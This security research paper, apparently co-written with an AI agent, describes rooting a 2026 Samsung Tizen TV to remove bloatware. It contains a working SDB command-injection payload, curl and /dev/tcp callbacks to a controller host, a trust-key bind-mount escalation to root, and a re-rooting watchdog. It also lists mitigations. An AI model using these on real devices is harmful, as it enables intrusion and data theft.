# Breaking and Rooting a 2026 Samsung Tizen 9.0 Smart TV

## A Reproducible Archive-Root Chain, its Persistence Model, and an Application to Firmware Debloating

**Swarnaditya Singh**¹ · **DeepSeek V4.1 Flash**²

¹ Independent Researcher · ² OpenCode Research Agent

*Correspondence:* Swarnaditya Singh.
*Artifact:* source, tooling, and raw evidence accompany this document (`tools/`, `evidence/`).
*Date:* 2026-10-18.

---

## Abstract

We present a full end-to-end compromise of a retail 2026 Samsung smart TV
(`QA55QEF1AULXL`, Tizen 9.0.0, firmware `T-RSLFUABC-0090-REL-202608061940`, SoC
platform `rosel`). Starting from an unauthenticated attacker on the same L2
network and an owner-enabled Developer Mode, we reach **verified `uid=0`
execution** (`uid=0 euid=0 gid=0 egid=0`, `CapEff=0000003fffffffff`, SMACK label
`User`) using only *publicly documented* techniques: the SDB package-name command
injection `SVE-2025-50109` as the initial foothold, and the model-independent
**archive-root** method from the open-source `chris-ritsen/samsung-tv-root`
project as the privilege-escalation chain. Our contribution is threefold. First,
a **new reproduction on a 2026 model and firmware** not previously documented.
Second, an empirical characterisation of the target's **mount topology and boot
semantics** showing that on-device persistence is *provably impossible* here, and
a corresponding **host-side controller** that re-arms root automatically after
every reboot. Third, a **systems application**: we use the resulting root to
remove 84 preinstalled packages (including advertising, ACR, telemetry, and
autostart campaigns), reducing the installed-package count from 511 to 427 with
zero failed systemd units, and we document the firmware's own kill-switch
mechanism that makes such removals durable. The chain is fully volatile on the
device and confirmed not to modify any system file.

**Keywords:** Android/Tizen security · command injection · capability abuse ·
mount-namespace trust-anchor substitution · embedded systems · firmware
debloating · Samsung Tizen · SDB.

---

## 1. Introduction

Smart TVs are the most-shipped general-purpose computers in the home, yet they
receive a fraction of the security attention given to phones and routers. Modern
Samsung televisions run **Tizen**, a Linux-based platform with SMACK mandatory
access control, signed-code enforcement, and a vendor tooling daemon (**SDB**,
Samsung Debug Bridge) that closely mirrors Android's ADB. When the owner enables
*Developer Mode*, that daemon is deliberately reachable from the LAN — turning
the TV into an attractive target on flat home networks and untrusted guest/IoT
SSIDs.

This paper documents a complete, reproducible privilege escalation against a
2026 Tizen 9.0 television. It is written in the tradition of the *field
write-up*: rather than introducing a novel vulnerability, we take an existing,
publicly reported entry bug and a public escalation chain, and we answer the
questions that a practitioner or defender actually asks:

* **R1 — Reproducibility.** Does the public chain still work on the newest
  2026 model/firmware, and what breaks?
* **R2 — Persistence.** Can root be made permanent on the device itself? If not,
  what is the honest persistence model?
* **R3 — Utility.** What is root *for*? We demonstrate a concrete goal — removal
  of preinstalled bloatware — and characterise which removals actually stick.

**Ethics and scope.** This work was performed on a television we own, for the
purpose of removing preinstalled advertising and telemetry software. The
foothold is a publicly reported vulnerability (`SVE-2025-50109`); the escalation
route is a public, model-independent method from an open-source project
(Unlicense). Nothing in this paper is novel exploitation. The chain was left
fully **volatile** — no system file was modified, and all staging was removed and
verified — so that disconnecting the controller returns the device to stock
behaviour. Do not run this against hardware you do not own.

The remainder of the paper is organised as follows. §2 gives background on the
SDB protocol, the trust model, and prior art. §3 describes the target. §4 covers
the entry vulnerability. §5 develops the archive-root chain. §6 records the
model-specific adaptations required for reproduction. §7 evaluates the result.
§8 analyses persistence. §9 applies root to debloating. §10–§11 discuss impact
and mitigations, and §12 concludes.

---

## 2. Background and Related Work

### 2.1 The SDB protocol

Samsung Debug Bridge reuses an ADB-like wire protocol: a `CNXN` handshake
followed by `OPEN`/`OKAY`/`WRTE`/`CLSE` frames on a multiplexed stream (a raw
capture appears in Appendix B). With Developer Mode enabled, an unprivileged
attacker on the LAN can connect and issue the *supported* commands:

```sh
sdb connect <TV_IP>:26101
sdb -s <TV_IP>:26101 shell 0 applist     # list installed packages
sdb -s <TV_IP>:26101 shell 0 getduid     # device unique id
sdb -s <TV_IP>:26101 uninstall <PKGID>   # remove a store app
```

Everything else — a bare `sdb shell`, `dlog`, `sdb pull` — returns `closed`. This
is the intended surface, and its "debloat" value is minimal: the TV ships **511+
packages**, the overwhelming majority of which are `org.tizen.*` and
`com.samsung.*` platform code that cannot be removed through it.

### 2.2 The trust model

The daemon advertises the following capability string on the wire:

```
capability: secure_protocol:enabled,sdk_toolpath:/home/owner/share/tmp/sdk_tools,
 appcmd_support:disabled,pkgcmd_debugmode:enabled,sdbd_rootperm:disabled,
 rootonoff_support:disabled,intershell_support:disabled,cpu_arch:armv7,core_abi:arm_32
```

Three flags — `intershell_support:disabled`, `sdbd_rootperm:disabled`, and
`rootonoff_support:disabled` — state explicitly that the TV exposes **no
interactive shell and no root path**. Complementing this, the device enforces
**SMACK** mandatory access control (compromised SDK processes run with the
`System` label), vendor **UEP** signature enforcement on native executables, and
Tizen's signed-package requirement.

### 2.3 Prior art

* **`SVE-2025-50109`** — the SDB package-name command injection, a public
  advisory (reported by Bishop Fox), affecting Tizen ≤ 9.0 [1]. This is our entry
  primitive.
* **`chris-ritsen/samsung-tv-root`** (Unlicense) [2] — the archive-root method,
  the `dotnet`/`tarlauncher` capability primitive, the private-mount-namespace
  trust-anchor substitution, the HMAC-authenticated root-agent protocol, and the
  timing oracle. This is the source of truth for the chain we reproduce.
* **CVE-2025-0072** — a Mali GPU use-after-free used by upstream's QN90F path
  [3]. *Not* used here; our route requires no kernel primitive.

Our work adds a live reproduction on a 2026 `QA55QEF1AULXL`
(`T-RSLFUABC-0090-REL-202608061940`, platform `rosel`), the model-specific
adaptations of §6, the persistence analysis of §8, and the debloating application
of §9.

---

## 3. The Target Device

```
$ id
uid=901(sdk) gid=901(sdk) groups=29(audio),44(video),201(display),901(sdk),1051(system_share),
1901(log),6525(usb_device),10001(priv_externalstorage),10013(priv_tee_client),
10014(priv_peripheralio),10212(priv_platform),10501(priv_camera),10502(priv_mediastorage),
10503(priv_recorder),10704(priv_internet),10705(priv_network_get),10711(priv_tethering_admin),
10901(priv_email),10903(priv_message_read),11103(priv_mapservice),11201(priv_appdebugging)
context="System"

$ uname -a
Linux Samsung 5.4.261 #1 SMP PREEMPT Sat Jun 27 16:55:17 UTC 2026 armv7l GNU/Linux

$ cat /etc/os-release
NAME=Tizen
VERSION="9.0.0 (Tizen9/TV)"
ID=tizen
VERSION_ID=9.0.0
BUILD_ID=T-RSLFUABC-0090-REL-202608061940
```

The daemon advertises itself as SDB `2.2.31` with plugin `3.8.11_TV_REL`. The
device is a 4× Cortex-A72 (`0xd08`) ARMv7 system on the `rosel` platform. Tizen
9.0 is the newest platform generation and is exactly the version range
`SVE-2025-50109` was reported to affect.

---

## 4. Entry Vulnerability: `SVE-2025-50109`

### 4.1 The bug

SDB still accepts the internal command

```
0 appinstall tpk <package-name>
```

and Samsung's install path interpolates `<package-name>` into a shell command
**without quoting**. Any shell metacharacter in the name is therefore evaluated.
The cleanest primitive is **backtick command substitution**, which the TV-side
filter does not block on this path. (A naive `sdb install` push-side sweep is
misleading — it is the `shell` → `appinstall` path that matters.)

### 4.2 The payload

Because literal spaces are filtered, `${IFS}` supplies whitespace, and the script
is base64-encoded to dodge quoting and parser problems:

```console
$ python3 -c 'from samsung_tv_root.sdb import build_shell_injection, SDB_APPINSTALL_PREFIX as P;
  print(P+build_shell_injection("cat /home/owner/share/tmp/sdk_tools/recon.sh | /bin/bash", gate_token="0123456789abcdef"))'
0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}L2Jpbi9ta2RpciAvdG1wL3MtMDEyMzQ1Njc4OWFiY2RlZiAyPi9kZXYvbnVsbCYmeyBjYXQgL2hvbWUvb3duZXIvc2hhcmUvdG1wL3Nka190b29scy9yZWNvbi5zaCB8IC9iaW4vYmFzaDt9|base64${IFS}-d|bash`.tpk
```

which base64-decodes to:

```sh
/bin/mkdir /tmp/s-0123456789abcdef 2>/dev/null&&{ cat /home/owner/share/tmp/sdk_tools/recon.sh | /bin/bash;}
```

The `mkdir /tmp/s-<token>` prefix makes the executed payload **idempotent** and
provides an observable side effect despite the absence of an output channel. The
whole argument must stay **≤ 510 bytes** (SDB's `appinstall` limit); longer
commands are staged as a file first and fetched with `cat … | bash`.

### 4.3 Confirming execution: the timing oracle

The daemon replies `closed` whether or not the injection ran, so `closed` is *not*
a rejection. To prove execution without trusting the reply, we run two injections
and measure elapsed wall-clock time:

| Probe | Command substituted in | Expected |
|---|---|---|
| control | `/bin/true` | fast |
| delayed | `/bin/sleep 2` | ~2 s slower |

The measured delta was **≥ 1.5 s** (observed ≈ 2.21 s for the delay probe),
establishing that the injected text executes. This is the same oracle the
upstream project uses.

### 4.4 Exfiltration channel

There is no stdout back to the attacker, so results are exfiltrated over TCP:

```sh
cat /path/script.sh | /bin/bash 2>&1 \
  | curl -s -m 15 -X POST --data-binary @- http://<HOST>:8000/<tag>
```

On the target, `curl`, `bash`, `sh`, `tar`, `openssl`, `unshare`, and `nsenter`
are present; `wget`, `nc`, `busybox`, `python3`, `timeout`, `su`, and `sudo` are
**not**. Bash's `/dev/tcp` is available as a fallback transport.

### 4.5 The UEP wall

Samsung's **UEP** signature enforcement blocks execution of unsigned native
files:

```
[uep][bash] the file is NOT signed!! : /path/to/script.sh
```

Two workarounds matter here:

* **Pipe to the interpreter**, don't `exec` the file: `cat script.sh | bash`
  works because no unsigned file is passed to `execve`.
* **Run managed code through a signed host.** Samsung ships `/usr/bin/dotnet`
  with file capabilities, so a managed assembly is merely *data* to an
  already-trusted binary. This is the key that unlocks the root route.

---

## 5. The Archive-Root Chain

This is the **model-independent archive-root** method. It abuses a privileged
Samsung component that *verifies and then executes a signed archive* — by
supplying both the archive and the key it verifies against, inside a private
mount namespace.

### 5.1 Reconnaissance as `uid=901(sdk)`

Full capture: `evidence/recon-as-sdk.txt`. The capability-bearing binaries are
decisive:

```
/usr/bin/dotnet            cap_setgid,cap_sys_admin=ei          <-- the lever
/usr/sbin/sdbd-tarlauncher cap_setgid,cap_setuid=eip            <-- the root executor
/usr/bin/dotnet-launcher   cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_nice,cap_mac_override,cap_mac_admin=ei
/usr/bin/launchpad-starter cap_chown,cap_fowner,cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_nice,cap_mac_override,cap_mac_admin=eip
...and many more
```

Namespace support, required for the mount trick, is present:

```
$ unshare -m -U /bin/true && echo NS_OK
NS_OK
```

World-writable device nodes constitute an unused secondary attack surface that
we did *not* need but record for completeness:

```
crw-rw-rw- 1 root root     10, 193  /dev/sdp_mem       # physical-memory style device
crw-rw-rw- 1 root video    10,  51  /dev/tzmem         # TEE memory
crw-rw-rw- 1 root display  10,  45  /dev/mali0         # Mali GPU
crw-rw-rw- 1 root root     89,   N  /dev/i2c-*         # i2c buses
crw-rw-rw- 1 root root    244,   0  /dev/eeprom
crw-rw---- 1 root log       1,  11  /dev/kmsg          # sdk is in group log
```

`/dev/sdp_mem` is a 0666 physical-memory-style node analogous to the
`/dev/sdp_pqe_fdet` device used by the upstream QN90B exploit; a read can block,
so any probing must be wrapped defensively. We did not pursue this path because
the archive-root route needs no kernel primitive.

The device ships a full .NET 6 runtime:

```
/usr/share/dotnet/shared/Microsoft.NETCore.App/
  ├── 2.0.0 -> 6.0.9   (many compatibility symlinks)
  ├── ...
  └── 6.0.9/           (libcoreclr.so, corerun, System.Private.CoreLib.dll, …)
```

Mounts of interest: `/` is `vdfs ro`, `/tmp` is `tmpfs rw`, `/opt` is `vdfs rw`.
The SDK staging directory `/home/owner/share/tmp/sdk_tools` is world-writable.

### 5.2 The escalation chain

**Step 1 — obtain `CAP_SYS_ADMIN` from Samsung's own `dotnet`.**
`/usr/bin/dotnet` holds `cap_setgid,cap_sys_admin=ei`. When it runs a managed
assembly, the CLR executes inside that process, so our code runs with
`CAP_SYS_ADMIN` in `CapEff`. A tiny managed payload reads `/proc/self/status`
and confirms the required bits `(1<<6)|(1<<21)` = `CAP_SETGID|CAP_SYS_ADMIN`.

**Step 2 — private mount namespace.** The payload calls `unshare(CLONE_NEWNS)`
and remounts `/` `MS_REC|MS_PRIVATE`, so all subsequent mount changes are
invisible to the rest of the system.

**Step 3 — substitute the trust anchors** (only inside the namespace):

```c
mount("<staging>/public.pem", "/usr/share/sdbd/public.pem", NULL, MS_BIND, NULL);
mount("<staging>/passwd",     "/etc/passwd",                NULL, MS_BIND, NULL);
```

We now "own" the key that Samsung's launcher will verify against.

**Step 4 — sign our own archive and hand it to the privileged launcher.**
A `tar.gz` containing a `launch.sh` is signed with a freshly generated RSA-2048
key whose public half is the `public.pem` from Step 3. The privileged, signed
`/usr/sbin/sdbd-tarlauncher` (which holds `cap_setgid,cap_setuid=eip`) is then
invoked:

```
/usr/sbin/sdbd-tarlauncher \
    --package_name <package> \
    -xzf <staging>/on-demand/<package>.tar.gz \
    --to-command=/bin/sh
```

Because it verifies the signature against the key we bind-mounted, it accepts our
archive and runs `launch.sh` **as root**.

**Step 5 — the root agent calls home.** `launch.sh` execs a second managed
assembly:

```sh
#!/bin/sh
exec /usr/bin/dotnet <staging>/SamsungTvRootAgent.dll <HOST> <PORT> <staging>/root-agent.token <staging>
```

which connects back to the host controller and authenticates.

### 5.3 The protocol is authenticated

The agent server sends a 32-byte random **nonce**; every subsequent frame is
`<payload>\t<hmac-sha256(secret, nonce||0x00||payload)>`. The controller refuses
the session unless the connecting process reports `uid==euid==gid==egid==0` when
`require_root` is set. Consequently, the root evidence below is **not spoofable
by an unprivileged process**.

### 5.4 Result

```json
{
  "authenticated": true,
  "uid": 0, "euid": 0, "gid": 0, "egid": 0,
  "cap_eff": "0000003fffffffff",
  "smack": "User",
  "runtime": "6.0"
}
```

Root command execution:

```
$ id
uid=0(owner) gid=0(root) groups=0(root),29(audio),44(video),201(display),1901(log),
6509(app_logging),6525(usb_device),10001(priv_externalstorage),... context="User"

$ ls -la /etc/shadow && head -c 200 /etc/shadow
---------- 1 owner root 2177 2026-08-06 16:41 /etc/shadow
root:*:20063:0:99999:7:::

$ P=/opt/usr/.root-proof-$$; echo proof > $P && ls -la $P && rm -f $P && echo ROOT_WRITE_OK
-rw-rw-rw- 1 owner root 6 2026-10-18 20:44 /opt/usr/.root-proof-24824
ROOT_WRITE_OK

$ cat /etc/passwd
owner:x:0:0:owner:/home/owner:/bin/sh     # <- our bind-mounted view (proof of Step 3)
```

`/usr/share/sdbd/public.pem` hashed to our generated key (not Samsung's),
independently confirming that the bind mount took effect. The upstream tool then
reported:

```
"system_files_unchanged": true,
"staging_cleaned": true
```

---

## 6. Reproduction: Model-Specific Adaptations

The public tooling worked, but this 2026 `rosel` TV required three adaptations.
We record them because they are likely to recur on future models.

### 6.1 Samsung's `dotnet` is a stripped host

`/usr/bin/dotnet` is a 13,880-byte custom launcher, not the upstream .NET host. It
does **not** support `--list-runtimes` or `--info`:

```
$ /usr/bin/dotnet --list-runtimes
Unknown option --list-runtimes.
Usage: dotnet [options] [path-to-executable] [arguments]
Options:
--clr-path <path>   path to libcoreclr.so and runtime assemblies
...
```

The upstream preflight calls `dotnet --list-runtimes` to detect the runtime
version and therefore aborts. Since we already knew the runtime is **6.0.9**, the
driver replaces `_check_target` with a direct capability + hash check and pins
`runtime=6.0`.

### 6.2 Assemblies under `/tmp` refuse to load

This is the subtle failure. The host runs assemblies fine from `/opt/usr/dotnet`
and from `/home/owner/share/tmp/sdk_tools`, but **any** DLL under `/tmp` fails:

```
$ /usr/bin/dotnet /tmp/x/SamsungTvArchiveRoot.dll
The specified file does not exist.       # even though the file is right there
$ /usr/bin/dotnet /home/owner/share/tmp/sdk_tools/x/SamsungTvArchiveRoot.dll
# loads correctly
```

We isolated it by copying a *Samsung-shipped* DLL into `/tmp` (also fails) and
into sdk_tools (works). The practical consequence is harmless, because the
archive-root staging directory is `/home/owner/share/tmp/sdk_tools/<package>`,
not `/tmp`. But any payload staged in `/tmp` will mysteriously fail.

### 6.3 Firewall and callback reachability

The exploit is *callback-based*: the TV must open an inbound TCP connection back
to the controller. Our host firewall silently dropped everything except `8000`,
which looked exactly like "the injection isn't running". The fix was to open the
needed ports and pin the two listeners:

* capture listener → `45777`
* root-agent listener → `8000`

**Lesson.** Always test the callback path independently of the exploit. A
listener plus `bash -c 'exec 3<>/dev/tcp/<HOST>/<PORT>'` on the TV is enough to
distinguish "blocked by firewall" from "exploit failed". Note also that the TV
has no `timeout`, so callback probes must not use it — doing so produces false
negatives.

---

## 7. Evaluation

| Property | Observation |
|---|---|
| Resulting identity | `uid=0 euid=0 gid=0 egid=0`, SMACK `User` |
| Effective capabilities | `0000003fffffffff` |
| Privileged reads | `/etc/shadow` (mode `0000`) readable |
| Privileged writes | root-owned directories writable (`ROOT_WRITE_OK`) |
| Protocol authenticity | HMAC-SHA256 over per-session nonce; root identity asserted |
| System files modified | none (`system_files_unchanged: true`) |
| Staging left behind | none (`staging_cleaned: true`) |
| Time to root (from controller start) | ≈ 9–11 s |
| Pivot primitive required | none beyond vendor-signed binaries |

The chain is *entirely userland*: it composes a command injection, a
capability-bearing interpreter, a private mount namespace, a signature-verification
confusion, and an authenticated reverse agent. No kernel bug, no memory
corruption, and no cryptographic break is involved.

---

## 8. Persistence Without On-Device Writes

This route is **non-persistent on the device**:

* The mount namespace and its bind mounts die with the payload process.
* The root agent is a child process; it exits after the session.
* No system file is modified. The tool hashes `/etc/passwd` and
  `/usr/share/sdbd/public.pem` before and after and asserts they are unchanged.
* All staging under `/home/owner/share/tmp/sdk_tools/<package>` and
  `…/on-demand/<package>.tar.gz` (+ signature) is deleted and the deletion
  verified.

A reboot clears everything. The "always rooted" behaviour described by upstream
comes from an external controller re-running the injection after each boot — not
from on-device persistence. We verified that directly (§8.1) and then built the
host-side controller that makes root effectively permanent (§8.2).

### 8.1 On-device persistence is impossible on this target

We searched specifically for a writable location that is executed at boot. There
is none, for four independent reasons.

1. **The boot hooks live on read-only partitions.** `/` is `vdfs ro` (1.4 G, 100 %
   used) and the "product" partition `/prd` is also `vdfs ro` (53 M, 100 % used):

   ```
   /dev/root     on /     type vdfs (ro,relatime,posixacl)
   /dev/subroot2 on /prd  type vdfs (ro,relatime,posixacl)
   /dev/mmcblk0p20 on /mnt/systemrw type vdfs (rw,noatime,posixacl,dncs)
   /dev/mmcblk0p21 on /opt        type vdfs (rw,noatime,posixacl,dncs)
   ```

   The only writable persistent areas are `/opt` and `/mnt/systemrw`; `/tmp`,
   `/run` and `/var/run` are tmpfs.

2. **systemd has no writable directory on its unit search path.** PID 1 is systemd
   244 and reports:

   ```
   UnitPath=/etc/systemd/system /run/systemd/system /run/systemd/generator
            /usr/lib/systemd/system /prd/usr/lib/systemd/system
            /run/systemd/generator.late
   ```

   Every entry except the `/run` generators is on a read-only partition. `/opt`
   and `/mnt/systemrw` are *not* searched. We proved this by dropping a probe unit
   into both `/opt/etc/systemd/` and `/opt/usr/share/systemd/system/` (both
   writable), running `systemctl daemon-reload`, and looking for it: `found: 0` in
   each case.

   The unit files that *do* watch writable paths (e.g. `tts-download-service.path`,
   `vdtizen-bootseq-*.path`) only trigger fixed, signed binaries — none of them
   runs a script from a directory we control.

3. **Unsigned code will not run.** The kernel UEP rejects unsigned native
   executables (`[uep][bash] the file is NOT signed!!`), and Tizen refuses to
   install an unsigned package. The only unsigned-code primitive we have (managed
   code via the signed `/usr/bin/dotnet`) still must be *invoked*, which needs a
   boot hook.

4. **Writable boot state is volatile.** `/run/systemd/system` *is* on the unit
   path and writable, but it is tmpfs, so anything placed there is gone after the
   next boot by design.

Persistence on this target therefore cannot be "drop a file and forget it"; it
must be re-armed from outside the TV after every boot — exactly what upstream
does.

### 8.2 The host-side controller (`tools/`)

`tools/tv-rootwatch.sh` is a small watchdog that re-arms root automatically:

* sdbd exists only while the TV is running, so the watchdog polls TCP
  `10.27.27.3:26101` every 5 s. A reachable → unreachable → reachable transition
  indicates a reboot.
* On startup, and on every such transition, it runs the archive-root exploit
  through `tools/tv-root-run.py` (a configurable wrapper around the upstream
  package that pins the two firewall-open ports and the `6.0` runtime preflight).
* It records success only if the agent authenticated **and** returned `uid=0`, and
  logs the resulting kernel `boot_id`.

`tools/tv-root-run.py` can also be used directly:

```sh
TV=10.27.27.3 HOST=10.27.27.34 ./tools/tv-root-run.py 'id' 'ls -la /opt'
```

It is installed as a **user** systemd service (no host root needed) and made to
survive logout with `loginctl enable-linger`:

```sh
systemctl --user enable --now tv-rootwatch.service
loginctl enable-linger "$USER"          # required, or it stops at logout
systemctl --user status  tv-rootwatch.service
journalctl --user -u tv-rootwatch.service -f      # or ~/.local/state/tv-root/rootwatch.log
```

Verified end-to-end on this TV: from a fresh start, the watchdog detected the
device and had an authenticated `uid=0` agent **~9 seconds later** (`boot_id`
`0e296d59-…139ab6`); a later run completed re-root plus debloat re-application in
11 s.

To undo it completely:

```sh
systemctl --user disable --now tv-rootwatch.service
rm ~/.config/systemd/user/tv-rootwatch.service
```

The watchdog modifies nothing on the TV; it re-runs the same volatile exploit, so
disabling it returns the device to exactly the state described above.

---

## 9. Application: Firmware Debloating

The motivation for rooting this TV was bloatware removal. Root exposes two
mechanisms that the supported SDB surface hides:

* **`pkgcmd -u -n <pkgid>`** uninstalls a package as root, bypassing the
  `can not uninstall app` and dependency locks that `sdb uninstall` hits. Once the
  package is gone, the firmware itself drops a **kill-switch marker** at
  `/opt/usr/share/systemd/system/<name>`; most service units are written as
  `ConditionPathExists=!/opt/usr/share/systemd/system/<name>`, so the service then
  refuses to start. (Only some units use a marker name equal to the package name —
  `canalysis-daemon`, `pisa-service`, `ghdaemon`, … require the marker to be
  written by hand.)
* **`pkgcmd -D -n <pkgid>`** deactivates a package without uninstalling it, for a
  reversible disable rather than removal.

`/opt/usr/share/systemd/system/` is on the writable `/opt` partition, so these
markers persist across reboots. Services that have no marker (e.g. `data-service`,
`sp-kpi`, `media-analytics-service`) are stopped and masked in
`/run/systemd/system` instead — which is tmpfs, so the watchdog re-applies those
masks after each boot (§8.2).

### 9.1 Results

| Metric | Before | After |
|---|---|---|
| Installed packages (root `pkgcmd -l`) | 511 | **427** |
| Packages removed directly | — | 65 |
| Packages removed incl. dependants | — | **84** |
| Running services | 146 | 138 |
| Failed systemd units | 0 | **0** |

Removal groups targeted advertising/ACR/telemetry, promotional autostart
campaigns, gaming, Bixby/Alexa/voice assistants, SmartThings/IoT, Samsung Health,
and Art/Ambient extras. Core functionality was preserved and verified: YouTube,
Privacy Choices, the app store, the browser, all DRM, all `org.tizen.*` core,
`com.samsung.tv.coba.*` (home UI) and `com.samsung.tv.home.*` (home tabs) remain
intact, and `display-manager`, the launcher, and security services came up
normally. The exact removal set is enumerated in `README.md` §3b and applied by
`tools/tv-debloat-apply.sh` (idempotent).

---

## 10. Impact

Once the root agent is established, the owner (or an attacker) has full control of
the device: read/write any file (including `/etc/shadow`), load modules (`kmod`),
change system services, disable UEP for native execution, and install
persistence. For a *lost or shared* TV, this is a complete compromise reachable
from anywhere on the same L2 network with no user interaction.

Even before escalation, the entry bug alone yields `uid=901(sdk)` with the
`System` SMACK label — enough to read `/dev/kmsg`, list other apps' data
directories, and talk to privileged local services. That alone is a serious
finding.

This is *not* a remote-internet compromise: SDB is reachable only on the LAN and
requires the owner to have enabled Developer Mode. The realistic threat model is a
hostile device on the same network, or a malicious app/config able to reach
`localhost:26101`.

---

## 11. Mitigations

**For Samsung:**

1. **Quote/sanitise the package name** in the `appinstall` path (the direct fix for
   `SVE-2025-50109`). Reject shell metacharacters (`` ` `` `$ | ; & > < ( ) { } [ ]`).
2. **Do not let the launcher's verification key be overridable by a bind mount.**
   Verify against a key that is not replaceable from a namespace the caller
   controls, or open the key through an fd that cannot be redirected. This is what
   turns `CAP_SYS_ADMIN` in *any* local process into root.
3. **Drop file capabilities from general-purpose runtimes.** `/usr/bin/dotnet`
   should not carry `cap_sys_admin`; privileged work belongs in a small, audited
   helper.
4. **Tie SDB to Developer Mode plus a trusted host**, and treat
   `intershell_support:disabled` as "not yet enabled", not "not reachable".

**For owners:**

* Disable Developer Mode when not actively developing; it removes the SDB attack
  surface entirely.
* Keep the TV on a separate VLAN/IoT SSID from general-purpose devices.
* Block the preload/ad endpoints (`osb-*.samsungqbe.com`, ACR/log endpoints) at DNS
  to stop apps like Samsung TV Plus from silently returning after removal.

---

## 12. Conclusion

We reproduced a complete, verified root compromise of a 2026 Samsung Tizen 9.0
television using only public techniques, and we characterised the properties that
matter to practitioners and defenders: the chain is entirely userland and needs no
kernel primitive; it modifies no system file and is fully volatile; and — contrary
to the impression given by "persistent root" tooling — on-device boot persistence
is *provably impossible* on this target, so durable root requires an external
controller that re-arms after each boot. We built that controller, demonstrated
that it restores root in roughly ten seconds, and used the resulting access to
remove 84 preinstalled packages (511 → 427) with zero failed units while
preserving all core functionality. The firmware's own kill-switch markers make
those removals durable. Our hope is that the reproduction notes of §6 and the
persistence analysis of §8 save other researchers the time it cost us, and that
the concrete mitigations of §11 are actionable for the vendor.

---

## References

[1] Bishop Fox. *SVE-2025-50109: Samsung Tizen SDB package-name command
injection.* Public advisory, 2025. The initial `uid=901(sdk)` foothold.

[2] C. Ritsen. *samsung-tv-root* (Unlicense). GitHub repository,
<https://github.com/chris-ritsen/samsung-tv-root>, commit
`4ad2c4d3b0d0e0da4b5b7ebe4a787e94596f416b` (2026-09-28). The archive-root method,
the `dotnet`/`tarlauncher` capability primitive, the private-mount-namespace
trust-anchor substitution, the HMAC-authenticated root-agent protocol, and the
timing oracle.

[3] *CVE-2025-0072*: ARM Mali GPU use-after-free. Used by the upstream QN90F path;
*not* used here.

---

## Appendix A — Exact Injection

```
0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<BASE64>|base64${IFS}-d|bash`.tpk
```

with the decoded script prefix (idempotency gate):

```sh
/bin/mkdir /tmp/s-<16 hex> 2>/dev/null&&{ <command>;}
```

## Appendix B — Raw SDB Wire Protocol

Handshake (host → device → host):

```
> CNXN  \x00\x00\x10\x00  host::\x00
< CNXN  device::QA55QEF1AULXL::0\x00
> OPEN  ... capability:\x00
< OKAY  ...
< WRTE  ... secure_protocol:enabled\n
> OPEN  ... shell:0 applist\x00
```

The metacharacter filter is TV-side and answers `CLSE` (connection close) when it
rejects. Raw capture: `evidence/sdb-protocol-capture.txt`.

## Appendix C — Reproducing

```sh
# 0. prerequisites: Samsung `sdb` (v4.2.x), Python 3, openssl, .NET 6 SDK (to build payloads)
git clone https://github.com/chris-ritsen/samsung-tv-root
cd samsung-tv-root
make common-payload DOTNET=/usr/sbin/dotnet      # builds payloads/common/out/*.dll

# 1. TV in Developer Mode, host IP registered, TV reachable on 26101
sdb connect <TV_IP>:26101

# 2. verify the injection works (timing oracle) and that the callback path is open
#    -- see do_root.py in evidence/ for the full driver
```

The driver used here (`do_root.py`) monkey-patches only what §6 requires:

* `_check_target` → skip `--list-runtimes`, detect runtime as `6.0`;
* `SdbClient.capture` → pin the capture listener to a firewalled-open port (`45777`);
* `RootAgentServer` → pin the root-agent listener to an open port (`8000`).

Everything else is upstream code.
